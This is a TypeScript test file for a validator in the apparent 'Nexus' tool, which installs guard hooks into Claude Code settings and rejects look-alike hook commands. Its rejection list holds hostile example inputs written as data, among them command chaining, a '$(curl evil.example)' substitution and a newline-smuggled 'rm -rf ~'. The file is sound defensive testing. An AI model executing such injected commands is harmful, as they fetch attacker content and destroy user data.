import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { pathToFileURL } from "node:url";
import { guardCommand, isNexusGuardCommand } from "../install.js";
import { nexusHookCommand } from "./nexus-hook.js";

describe("nexusHookCommand", () => {
  it("accepts exactly the commands Nexus writes, with the entry script they name", () => {
    assert.deepEqual(nexusHookCommand('node "/opt/pkg/dist/guard/hook.js"'), { script: "/opt/pkg/dist/guard/hook.js" });
    assert.deepEqual(nexusHookCommand("node /opt/pkg/dist/guard/hook.js"), { script: "/opt/pkg/dist/guard/hook.js" });
    assert.deepEqual(nexusHookCommand('node "/opt/my pkg/dist/cli/index.js" guard check'), { script: "/opt/my pkg/dist/cli/index.js" });
    const win = JSON.stringify("C:\\Users\\me\\nexus\\dist\\guard\\hook.js");
    assert.deepEqual(nexusHookCommand(`node.exe ${win}`), { script: "C:\\\\Users\\\\me\\\\nexus\\\\dist\\\\guard\\\\hook.js" });
    assert.deepEqual(nexusHookCommand("nexus guard check"), { script: null });
    assert.notEqual(nexusHookCommand(guardCommand()), null, "what guardCommand() writes from source");
    assert.deepEqual(nexusHookCommand("npx @hawon/nexus guard check"), { script: null });
    assert.deepEqual(nexusHookCommand("npx @hawon/nexus@0.8.0 guard check"), { script: null });
  });

  it("rejects look-alikes that isNexusGuardCommand accepts", () => {
    for (const command of [
      "exit 0; npx @hawon/nexus guard check",
      "sh ./evil.sh && nexus guard check",
      "node -e 0 /opt/pkg/dist/guard/hook.js",
      "node /opt/pkg/dist/guard/hook.js guard check",
      "true scan-tool-result.sh",
      "node dist/cli/index.js guard check",
      'node "$(curl evil.example)/dist/guard/hook.js"',
      "node `x`/dist/guard/hook.js",
      "/tmp/evil/nexus guard check",
      "npx -y @hawon/nexus guard check",
      "npx @hawon/nexus-evil guard check",
      "nexus guard check\nrm -rf ~",
    ]) {
      assert.equal(nexusHookCommand(command), null, command);
    }
    assert.equal(isNexusGuardCommand("exit 0; npx @hawon/nexus guard check"), true, "the loose check install uses");
  });
});

// Under tsx, install.ts sits in src/ (no hook.js beside it), so the installed
// command and this install's own entries are checked on the BUILT package.
describe("the built package's own guard hook", () => {
  type Built = {
    install: typeof import("../install.js");
    context: typeof import("./context.js");
    enumerate: typeof import("./enumerate.js");
  };
  async function built(t: { skip(message: string): void }): Promise<Built | null> {
    const file = (p: string) => resolve("dist", "guard", p);
    if (![file("install.js"), file("hook.js"), file("integrity/enumerate.js"), file("integrity/context.js")].every(existsSync)) {
      t.skip("dist/ not built — run `npm run build` first");
      return null;
    }
    const load = (p: string) => import(pathToFileURL(file(p)).href);
    const install = (await load("install.js")) as Built["install"];
    if (typeof install.nexusEntryScripts !== "function") {
      t.skip("dist/ is older than this source — run `npm run build` first");
      return null;
    }
    return { install, context: await load("integrity/context.js"), enumerate: await load("integrity/enumerate.js") };
  }

  it("guardCommand() names nexusEntryScripts()'s hook entry, and enumeration leaves only that script unwatched", async (t) => {
    const b = await built(t);
    if (!b) return;
    const [hook, cli] = b.install.nexusEntryScripts();
    const command = b.install.guardCommand();
    assert.deepEqual(nexusHookCommand(command), { script: JSON.stringify(hook).slice(1, -1) });
    assert.notEqual(nexusHookCommand(`node ${JSON.stringify(cli)} guard check`), null);

    const dir = realpathSync(mkdtempSync(join(tmpdir(), "nexus-own-hook-")));
    try {
      const home = join(dir, "home");
      const repo = join(dir, "repo");
      mkdirSync(join(home, ".claude"), { recursive: true });
      mkdirSync(join(repo, ".git"), { recursive: true });
      const lookAlike = join(repo, "tools", "dist", "guard", "hook.js");
      mkdirSync(join(lookAlike, ".."), { recursive: true });
      writeFileSync(lookAlike, "console.log('not nexus')\n");
      mkdirSync(join(repo, ".claude"));
      writeFileSync(join(repo, ".claude", "settings.json"), JSON.stringify({
        hooks: { PreToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command }, { type: "command", command: `node ${JSON.stringify(lookAlike)}` }] }] },
      }));
      const ctx = b.context.contextFromHook({ cwd: repo }, { platform: process.platform, homedir: home, env: {}, dataDir: join(dir, "data"), managedDir: join(dir, "managed") });
      assert.ok(ctx);
      assert.deepEqual(b.enumerate.enumerateWatched(ctx).prefixes.hookScripts, [lookAlike]);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
